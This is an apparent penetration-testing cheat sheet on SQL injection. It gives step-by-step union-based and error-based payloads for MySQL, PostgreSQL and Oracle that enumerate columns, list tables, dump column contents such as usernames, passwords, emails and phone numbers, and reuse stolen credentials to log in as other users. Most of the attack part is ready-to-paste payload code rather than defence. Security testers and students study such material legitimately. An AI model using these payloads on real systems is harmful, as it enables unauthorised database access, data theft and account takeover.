# SQLI

The leading cause of SQL injection is string concatenation.

This vulnerability can be exploited to dump the contents of an application database.

#### The two most common types of SQL injection are union-based and error-based.

1. **Union-based SQL injection:** uses the “UNION” SQL operator to combine the results of two or more “SELECT” statements into a single result.
2. **Error-based SQL injection:** utilizes the errors the SQL server throws to extract information.

## <mark style="color:yellow;">MySql</mark>

Automation: using[ SqlMap](https://github.com/sqlmapproject/sqlmap).

{% tabs %}
{% tab title="¯\_(ツ)_/¯" %}
Swap tabs
{% endtab %}

{% tab title="Union Based" %}


Once you know that an endpoint is vulnerable to SQL injection the next step is to exploit it:

* Figure out how many columns the endpoint contains using the “order by” operator and keep adding one to the number until you get an error:

&#x20;     \--> Order by 1 --> Order by 2 --> Order by n --> error (indicates there must be n-1 columns).

* Figure out which columns are being displayed on the page using the “union all select” statement which can be accomplished by putting an invalid value:

&#x20;    \--> Notice the numbers on the page refer to the columns displayed on the front end.

* Display the database version using mysql commands:

&#x20;     \--> @@version /  version()

&#x20;     \--> 💡Note the version down to help later

* get a list of database tables:

```sql
union all select 1,2,group_concat(table_name) from information_schema.tables 
where table_schema = database()
```

* Get the table's columns

```sql
union all select 1,2,group_concat(column_name) from information_schema.columns where table_name = "tbName" 
```

* Dump the contents of specific columns:

```sql
union all select 1,2,group_concat(col,":",col) from tbNa
```

In case retrieving username:password for a user, we can use them to log in as that user.
{% endtab %}

{% tab title="Error Based" %}
Useful when there is no output except a SQL error.

**Xpath**

If the MySql service version is 5.1 or later we can use the “ extractvalue() ” function to exfiltrate data from the database.&#x20;

* generates a SQL error when it is unable to parse the XML data passed to it.

#### ExtractValue() function

* used to parse out a value from an XML document&#x20;
* The first argument is an XML document and the second argument is the tag we want to get the value of.&#x20;
* second argument starts with a “;” it will cause a MySql error message to appear along with the string that caused the error.

#### Abusing ExtractValue() function to extract data via error messages:

* extract the MySql database version via an error message:

```sql
AND extractvalue("blahh",concat(";",@@version))
```

* get a list of table names:

```sql

// Note: The “limit 0,1” command is used to get the first row in the table
// and to get the second table you would use “limit 1,1”
AND extractvalue("blahh",(select concat(";",table_name) from information_schema.tables where table_schema = database() limit 0,1)) 
```

* Get a list of columns belonging to a specific table:

```sql
AND extractvalue("blahh",(select concat(";",column_name) from information_schema.columns where table_name = "tbName" limit 0,1))
```

* dump the contents of specific columns:

```sql
AND extractvalue("blahh",(select concat(";",col,":",col) from tbName limit 0,1))
```

In case retrieving username:password for a user, we can use them to log in as that user.
{% endtab %}
{% endtabs %}

## <mark style="color:yellow;">PostgreSQL</mark>

In case an error message is displayed, if you see the “<mark style="color:red;">psycopg2</mark>” name you know you’re working with a Postgres database server.

**Union Based**

* Figure out how many columns the endpoint contains using the “order by” operator and keep adding one to the number until you get an error:

&#x20;     \--> Order by 1 --> Order by 2 --> Order by n --> error (indicates there must be n-1 columns).

* Figure out which columns are being displayed on the page using the “union all select” statement which can be accomplished by putting an invalid value:

&#x20;    \--> Notice the numbers on the page refer to the columns displayed on the front end.

If you weren't able to detect the database type from the error message you could always use the “version()” function to print the database type:&#x20;

&#x20;   \-->-1 union all select 1,version()

* Get a list of all tables in the databases:

<pre class="language-sql"><code class="lang-sql"><strong>// Offset ‘0’ gets the first table name, offset ‘1’ gets the second, and so on.
</strong>// filter out the default databases “pg_catalog” and “information_schema” as they tend to clog up the results. 
union all select 1,table_name from information_schema.tables where table_schema != 'pg_catalog' and table_schema != 'information_schema' offset 0 
</code></pre>

* Get a list of columns belonging to a specific table:

```sql
union all select 1,column_name from information_schema.columns where table_name = 'tbName' offset 0
```

* Dump the contents of specific columns:

```sql
union all select 1,concat(col,':',col) from tbName offset 0
```

In case retrieving username:password for a user, we can use them to log in as that user.

## <mark style="color:yellow;">Oracle</mark>

Requires some additional knowledge to successfully exploit it.

* Similar to PostgreSQL when you are selecting a column it must match the type of the first select statement.&#x20;
* When using the select operator you must specify a default “dual” table.

#### Test&#x20;

* Throw a bunch of single and double quotes around until you get an error message starting with “<mark style="color:red;">**ORA**</mark>” which indicates dealing with an Oracle database.&#x20;

**Union Based**

* Figure out how many columns the endpoint contains using the “order by” operator and keep adding one to the number until you get an error:

&#x20;     \--> Order by 1 --> Order by 2 --> Order by n --> error (indicates there must be n-1 columns).

* Figure out which columns are being displayed on the page using the “union all select” statement which can be accomplished by putting an invalid value:

&#x20;    \--> Notice the numbers on the page refer to the columns displayed on the front end.

* Figure out the target table name:

```sql

//Oracle uses the “all_tables” e to get a list of tables.
// When using the listagg() function you must also use the ‘within group()’ operator to specify the order of the listagg function results.
union all select LISTAGG(table_name,',') within group (ORDER BY table_name),null from all_tables where tablespace_name = 'USERS' --
```

* Get the table's columns:

```sql
union all select LISTAGG(column_name,',') within group (ORDER BY column_name),null from all_tab_columns where table_name = 'EMPLOYEES'-- 
```

* Extract the sensitive information

```sql
Union all select email,phone_number from employees 
```
